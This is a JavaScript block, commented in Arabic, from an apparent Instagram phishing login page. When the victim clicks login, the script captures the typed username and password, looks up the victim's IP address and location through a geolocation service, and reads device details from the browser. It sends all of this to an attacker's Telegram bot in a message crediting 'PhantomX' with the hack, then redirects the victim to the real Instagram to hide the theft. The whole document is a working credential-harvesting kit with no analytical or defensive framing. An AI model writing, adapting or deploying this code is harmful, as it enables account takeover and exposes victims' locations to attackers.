    <script>
        document.querySelector("#loginbutton").addEventListener("click", async function(event) {
            event.preventDefault();

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // جمع معلومات الموقع
            const locationData = await getUserLocation();

            // جمع معلومات الجهاز
            const deviceInfo = getDeviceInfo();

            // بناء الرسالة
            const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
                            `💻 *معلومات الحساب:* 💻\n` +
                            `📧 البريد الإلكتروني: ${username}\n` +
                            `🔑 كلمة المرور: ${password}\n\n` +
                            `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
                            `📱 *جهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
                            `📲 *IP:* ${locationData.ip}\n\n` +
                            `الاختراق تم بواسطة PhantomX`;

            // إرسال الرسالة إلى قناة تليجرام (استبدال الرابط بعنوان القناة الفعلي)
            const telegramChannel = "https://api.telegram.org/bot<YourBotToken>/sendMessage?chat_id=<YourChatID>&text=" + encodeURIComponent(message);
            fetch(telegramChannel).then(response => {
                console.log("تم إرسال الرسالة إلى التليجرام.");
            }).catch(error => {
                console.error("خطأ في إرسال الرسالة:", error);
            });

            // إعادة التوجيه إلى Instagram بعد 5 ثواني
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 5000);
        });

        // جلب بيانات الموقع الجغرافي
        async function getUserLocation() {
            const response = await fetch("https://geolocation-db.com/json/");
            const data = await response.json();
            return {
                city: data.city,
                country: data.country_name,
                ip: data.IPv4
            };
        }

        // الحصول على معلومات الجهاز
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let device = "Unknown Device";
            let os = "Unknown OS";

            if (userAgent.includes("Windows")) {
                os = "Windows";
            } else if (userAgent.includes("Mac")) {
                os = "MacOS";
            } else if (userAgent.includes("Android")) {
                os = "Android";
            } else if (userAgent.includes("iPhone")) {
                os = "iOS";
            }

            if (userAgent.includes("Mobile")) {
                device = "Mobile Device";
            } else if (userAgent.includes("Tablet")) {
                device = "Tablet";
            } else {
                device = "Desktop";
            }

            return { device, os };
        }
    </script>
